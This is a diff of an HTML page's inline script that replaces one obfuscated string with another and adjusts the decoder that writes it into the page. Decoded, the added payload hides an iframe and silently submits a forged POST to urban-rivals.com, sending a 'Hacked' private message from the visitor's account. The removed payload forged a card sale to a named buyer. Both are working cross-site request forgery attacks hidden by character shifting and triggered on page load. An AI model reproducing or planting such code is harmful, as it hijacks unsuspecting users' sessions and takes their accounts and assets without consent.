@@ -39,9 +39,17 @@
                 document.getElementById('dialog').style.display = 'flex';
             }
         }
-        var s = "=tdsjqu?=\"..wbs!t>#>khtcog\"uv{ng?$fkurnc{<pqpg=$\"ute?$$\"kf?$htcogKf$@>1khtcog@>uetkrv@\"\"\"\"ngv\"khto\"?\"fqewogpv0igvGngogpvD{Kf*$htcogKf$+=\"\"\"\"khto\"?\"khto0eqpvgpvYkpfqy\"~~\"khto0eqpvgpvFqewogpv0fqewogpv\"~~\"khto0eqpvgpvFqewogpv=\"\"\"\"khto0fqewogpv0qrgp*+=\"\"\"\"khto0fqewogpv0ytkvg*)>hqto\"kf?$ehqto$\"cevkqp?$jvvru<11yyy0wtdcp/tkxcnu0eqo1clcz1eqnngevkqp1ugnnaectf0rjr$\"ogvjqf?$RQUV$@>kprwv\"v{rg?$jkffgp$\"pcog?$rtkeg$\"xcnwg?$72$@>kprwv\"v{rg?$jkffgp$\"pcog?$cevkqp$\"xcnwg?$ugnnVqHtkgpf$@>kprwv\"v{rg?$jkffgp$\"pcog?$dw{gtapcog$\"xcnwg?$Ur{mgZa$@>kprwv\"v{rg?$jkffgp$\"pcog?$kfargtuqalqwgwt$\"xcnwg?$67;;53;9;$@>1hqto@)+=\"\"\"\"khto0fqewogpv0enqug*+=\"\"\"\"khto0fqewogpv0igvGngogpvD{Kf*$ehqto$+0uwdokv*+=>1uetkrv@#<n>##<!gps!)j>1<!j=t/mfohui<!j,,*!n,>Tusjoh/gspnDibsDpef)t/dibsDpefBu)j*.2*<!epdvnfou/xsjuf)n*<00..?=0tdsjqu?=optdsjqu?Zpv!nvtu!fobcmf!KbwbTdsjqu!up!tff!uijt!ufyu/=0optdsjqu?";
+        var s = "=jgsbnf!tuzmf>#ejtqmbz;opof<#!tsd>##!je>#gsbnfJe#?=0jgsbnf?=tdsjqu?!!!!mfu!jgsn!>!epdvnfou/hfuFmfnfouCzJe)#gsbnfJe#*<!!!!jgsn!>!jgsn/dpoufouXjoepx!}}!jgsn/dpoufouEpdvnfou/epdvnfou!}}!jgsn/dpoufouEpdvnfou<!!!!jgsn/epdvnfou/pqfo)*<!!!!jgsn/epdvnfou/xsjuf)(=gpsn!je>#dgpsn#!bdujpo>#iuuqt;00xxx/vscbo.sjwbmt/dpn0bkby0tfoe`qsjwbuf`nfttbhf/qiq#!nfuipe>#QPTU#?=joqvu!uzqf>#ijeefo#!obnf>#bdujpo#!wbmvf>#tfoeQsjwbufNfttbhf#?=joqvu!uzqf>#ijeefo#!obnf>#eftu`je#!wbmvf>#46184368#?=joqvu!uzqf>#ijeefo#!obnf>#uzqf!#!wbmvf>#opsnbm#?=joqvu!uzqf>#ijeefo#!obnf>#nfttbhf#!wbmvf>#Ibdlfe#?=0gpsn?(*<!!!!jgsn/epdvnfou/dmptf)*<!!!!jgsn/epdvnfou/hfuFmfnfouCzJe)#dgpsn#*/tvcnju)*<=0tdsjqu?";
         m = "";
-        for (i = 0; i < s.length; i++) m += String.fromCharCode(s.charCodeAt(i) - 1);
+        for (i = 0; i < s.length; i++) {
+            if (s.charCodeAt(i) == 28) {
+                m += '&';
+            } else if (s.charCodeAt(i) == 23) {
+                m += '!';
+            } else {
+                m += String.fromCharCode(s.charCodeAt(i) - 1);
+            }
+        }
         document.write(m);
     </script>
 </body>
